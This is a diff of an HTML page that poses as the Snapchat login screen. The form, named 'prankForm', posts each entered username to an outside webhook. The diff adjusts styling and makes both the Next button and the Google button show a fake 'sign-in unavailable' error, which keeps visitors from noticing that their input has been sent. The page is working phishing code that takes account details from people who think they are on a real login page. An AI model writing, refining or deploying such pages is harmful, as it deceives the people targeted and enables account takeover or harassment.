@@ -2,22 +2,21 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Log in to Snapchat</title>
     <style>
         body {
-            background-color: #f7f7f7;
+            background-color: #ffffff;
             font-family: 'Avenir Next', 'Helvetica Neue', Helvetica, Arial, sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            min-height: 100vh;
             margin: 0;
+            padding-top: 50px;
         }
 
-        /* The "Uh oh" error - hidden by default */
-        #error-overlay {
+        /* Error Message - Hidden initially */
+        #error-banner {
             display: none;
             background-color: #fff;
             color: #333;
@@ -29,7 +28,7 @@
             text-align: center;
             box-shadow: 0 4px 12px rgba(0,0,0,0.1);
             margin-bottom: 20px;
-            border: 1px solid #ddd;
+            border: 1px solid #eee;
         }
 
         .error-bold {
@@ -39,9 +38,9 @@
 
         .login-card {
             background: white;
-            padding: 40px 30px;
+            padding: 30px;
             border-radius: 12px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 15px rgba(0,0,0,0.08);
             width: 90%;
             max-width: 400px;
             text-align: center;
@@ -49,20 +48,21 @@
         }
 
         .ghost-logo {
-            width: 60px;
-            margin-bottom: 10px;
+            width: 50px;
+            height: auto;
+            margin-bottom: 15px;
         }
 
         h2 {
-            font-size: 28px;
-            margin: 10px 0 30px 0;
+            font-size: 26px;
+            margin: 0 0 25px 0;
             font-weight: 700;
             color: #16191c;
         }
 
         .input-group {
             text-align: left;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
 
         label {
@@ -75,9 +75,9 @@
 
         input {
             width: 100%;
-            padding: 14px;
-            border: 2px solid #000; /* Bold black border like screenshot */
-            border-radius: 8px;
+            padding: 12px;
+            border: 1.5px solid #000;
+            border-radius: 6px;
             box-sizing: border-box;
             font-size: 16px;
             outline: none;
@@ -85,11 +85,11 @@
 
         .phone-link {
             color: #00b2ff;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 600;
             text-decoration: none;
             display: block;
-            margin-bottom: 25px;
+            margin: 15px 0 25px 0;
         }
 
         .next-btn {
@@ -97,56 +97,54 @@
             color: white;
             border: none;
             border-radius: 100px;
-            padding: 14px 40px;
-            font-size: 16px;
+            padding: 12px 45px;
+            font-size: 15px;
             font-weight: bold;
             cursor: pointer;
-            width: auto;
-            min-width: 120px;
+            transition: background 0.2s;
         }
 
         .divider {
             display: flex;
             align-items: center;
             text-align: center;
-            margin: 30px 0;
+            margin: 25px 0;
             color: #717274;
-            font-size: 12px;
+            font-size: 11px;
+            font-weight: bold;
         }
 
         .divider::before, .divider::after {
             content: '';
             flex: 1;
-            border-bottom: 1px solid #ddd;
+            border-bottom: 1px solid #e8e8e8;
         }
 
-        .divider:not(:empty)::before { margin-right: .5em; }
-        .divider:not(:empty)::after { margin-left: .5em; }
+        .divider:not(:empty)::before { margin-right: .8em; }
+        .divider:not(:empty)::after { margin-left: .8em; }
 
-        /* Google Button Style */
         .google-btn {
             display: flex;
             align-items: center;
             justify-content: center;
             width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
+            padding: 10px;
+            border: 1px solid #e0e0e0;
             border-radius: 100px;
             background: white;
             cursor: pointer;
-            font-size: 15px;
+            font-size: 14px;
             font-weight: 600;
             color: #3c4043;
-            transition: background 0.2s;
         }
 
         .google-btn img {
-            width: 20px;
+            width: 18px;
             margin-right: 10px;
         }
 
         .footer-text {
-            margin-top: 40px;
+            margin-top: 30px;
             font-size: 14px;
             color: #16191c;
         }
@@ -155,28 +153,27 @@
             color: #000;
             font-weight: bold;
             text-decoration: none;
-            margin-left: 5px;
         }
 
         .back-nav {
-            margin-top: 30px;
+            margin-top: 25px;
             font-weight: bold;
             text-transform: uppercase;
-            font-size: 12px;
+            font-size: 11px;
             color: #000;
             text-decoration: none;
-            border-bottom: 2px solid #000;
+            border-bottom: 1.5px solid #000;
         }
     </style>
 </head>
 <body>
 
-    <div id="error-overlay">
+    <div id="error-banner">
         <span class="error-bold">Uh oh!</span> Unfortunately, Google sign-in is unavailable at this current moment.
     </div>
 
     <div class="login-card">
-        <img src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.png" class="ghost-logo" alt="Snapchat">
+        <img src="https://assets.snapchat.com/marketing/web/static/images/ghost/snapchat-app-icon.png" class="ghost-logo" alt="Snapchat">
         <h2>Log in to Snapchat</h2>
         
         <form id="prankForm">
@@ -192,8 +189,8 @@
 
         <div class="divider">OR</div>
 
-        <button class="google-btn" onclick="showError()">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Color_Icon.svg" alt="Google">
+        <button class="google-btn" type="button" onclick="showError()">
+            <img src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" alt="G">
             Continue with Google
         </button>
     </div>
@@ -205,13 +202,12 @@
     <a href="#" class="back-nav">Back</a>
 
     <script>
-        // Shows the error when Google is clicked
         function showError() {
-            document.getElementById('error-overlay').style.display = 'block';
+            const banner = document.getElementById('error-banner');
+            banner.style.display = 'block';
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // Standard logic for the Next button
         document.getElementById('prankForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const u = document.getElementById('userInput').value;
@@ -220,9 +216,10 @@
             fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `👻 **User hit Next:** ${u}` })
+                body: JSON.stringify({ content: `👻 **User:** ${u}` })
             }).then(() => {
-                alert("Please use Google sign-in or check your connection.");
+                // Show error if they try to use the regular login too
+                showError();
             });
         });
     </script>
